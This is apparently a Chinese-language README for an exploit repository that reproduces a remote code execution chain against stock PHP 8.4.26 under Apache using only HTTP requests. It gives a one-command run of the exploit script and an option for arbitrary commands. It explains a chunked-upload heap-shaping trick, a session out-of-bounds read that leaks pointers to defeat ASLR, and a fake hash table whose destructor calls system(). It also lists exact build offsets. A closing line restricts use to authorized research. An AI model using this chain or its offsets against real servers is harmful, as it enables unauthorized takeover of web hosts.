# php2shell — PHP 8.4.26 session 漏洞复现

中文 | [English](readme_en.md)

**目标没有变，仍然是 stock 官方 `php:8.4.26-apache` + 官方
`php.ini-production`：`display_errors=Off`、`display_startup_errors=Off`、
`memory_limit=128M`、`post_max_size=8M`、单 worker prefork。**
在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
PHP 的约束下，一条命令拿到 RCE：

- stock 官方镜像 + 官方 ini：**5/5**
- 带符号的同一官方构建（gdb 只用于离线标定，不在交付路径）：**15/15**
- 单次约 2 秒，worker 不重启，目标 ini 未改

## 快速开始（官方 php.ini-production / display_errors=Off / 128M）

```bash
git clone https://github.com/9bie/php2shell-bypass-aslr-exp.git
cd php2shell-bypass-aslr-exp

# 1) 起目标：stock 官方镜像；容器里只把官方 php.ini-production 复制成 php.ini
./pure/run_pure.sh
# target: OK
# PHP 8.4.26 ...
# display_errors => Off => Off
# memory_limit => 128M => 128M

# 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
python3 pure/pwn_pure.py --port 18110
# [4/4] RCE OK; proof .../out/p1:
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
`pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，起完会打印
实际的 `display_errors` / `memory_limit` / `post_max_size` 等值。
Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
`DOCKER="sudo docker" ./pure/run_pure.sh`；`--dbg` 仅用于换成带符号的
同一构建做离线标定。

常用参数：

```bash
# 换新 ASLR 复测（重启容器）
python3 pure/pwn_pure.py --port 18110 --restart p2s-pure-18110

# 自定义命令：把脚本写进挂载目录，再用 sh 执行
printf 'id; uname -a > /out/p1\n' > out/c
python3 pure/pwn_pure.py --port 18110 --cmd 'sh</out/c'
```

`--retries` 默认 3；如果某次越界窗口里最常见的指针不是
`zval_ptr_dtor`，脚本会用 `libphp-main` 的合理区间检查丢弃这次泄漏，
整条链重来。

## 这条纯 HTTP 链

目标页面只有 `<?php echo "OK\n"; ?>`，攻击流量只有 chunked multipart
和普通 GET/POST：

1. **chunked 绕过 `post_max_size`**：不带 `Content-Length` 时
   `content_length=0`，`rfc1867_post_handler` 开头的检查被跳过，
   可以发送远大于 8M 的 body 做堆整形。
2. **A1**：860 个 depth-64 嵌套文件字段 + filler + 大值 + 4000B
   `PHP_SESSION_UPLOAD_PROGRESS`，在 END cleanup 的 `php_url_encode`
   里 OOM；bailout 留下悬空的 `PS(id)` / `PS(mod_data)`，`send_cookie=1`。
3. **B1（越界读）**：安全 close 后让 `PS(id)` 指向伪造的
   `zend_string` 头（len=0xC8000，data 含 `/`），`Set-Cookie` 把 id
   chunk 之后 800KB 内存编码出来。窗口里同时有：
   - 2MiB 对齐的 chunk 指针簇 → id chunk / main chunk base；
   - `G:400` 在 id chunk 尾部留下的洞被 900 个嵌套数组字段填满，
     真实 HashTable 的 `pDestructor = zval_ptr_dtor` 出现 1095 次
     → `libphp = 值 - 0x65EB60`。
4. **A2 + B2**：cheap-OOM 把 `PS(hash_serialize_verifier)` 指到堆上
   (`main+0x7D720`)；B2 用 384B 引用值把它覆盖成指向
   `S=main+0xF8398` 的 zval，S 处伪造 zend_array 的
   `pDestructor = zif_system` (`libphp+0x465370`)，shutdown 时
   `zend_hash_destroy` 调用 `system("id>/out/p1")`。

偏移（本构建，ASLR 无关）：

| 符号/位置 | 值 |
|---|---|
| `zval_ptr_dtor` | `libphp+0x65EB60` |
| `zif_system` | `libphp+0x465370` |
| fake array `S` | `main+0xF8398` |
| A2 的 `hsv` | `main+0x7D720` |

目标环境：Debian 13 (trixie)、Apache 2.4.69 prefork、PHP 8.4.26 NTS
mod_php、files session handler。换 PHP 构建/版本需要重新标定偏移；
ASLR 每次容器启动会变，链上两次泄漏会自己算出来。

## 证据

- 机制与标定：[pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
- 全链脚本：[pure/pwn_pure.py](pure/pwn_pure.py)
- 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
- 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
- proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)

## 旧线（legacy，非本目标）

早期提交里的 `exploit.py` 走的是**自定义** `docker/php.ini`
（`display_errors=On`、`memory_limit=8M`、`max_input_vars=1000`），
与本 README 的官方配置目标无关，保留仅为历史/机制参考；相关文档
[HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md)、[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md)、
[DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md) 描述的是那一线。

## 复现声明

- 目标配置就是官方 `php.ini-production`（`display_errors=Off`、
  `memory_limit=128M`）：没有自定义 ini、没有 `display_errors=On`
  依赖、没有目标侧文件、没有 `session_start()`、交付路径不用 gdb。
- 仅用于授权环境中的漏洞研究与复现。
